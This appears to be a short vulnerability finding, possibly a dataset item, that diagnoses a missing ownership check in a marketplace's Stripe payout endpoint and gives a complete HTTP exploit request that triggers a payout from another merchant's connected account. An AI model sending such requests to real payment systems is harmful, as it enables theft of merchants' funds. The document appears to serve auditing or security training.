diagnosis: The marketplace payout endpoint initiates a Stripe payout for a connected account using stripeAccountId taken directly from the request body. It fails to verify that stripeAccountId is registered to req.user.id in the platform database. An attacker can trigger unauthorized payouts from other merchants' connected Stripe balances to their bank accounts.
exploit_request:
POST /api/marketplace/payouts/create HTTP/1.1
Host: marketplace.shophub.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsIn...
Content-Type: application/json

{
  "stripeAccountId": "acct_1MqwTargetMerchant99",
  "amount": 5000.00,
  "currency": "usd"
}
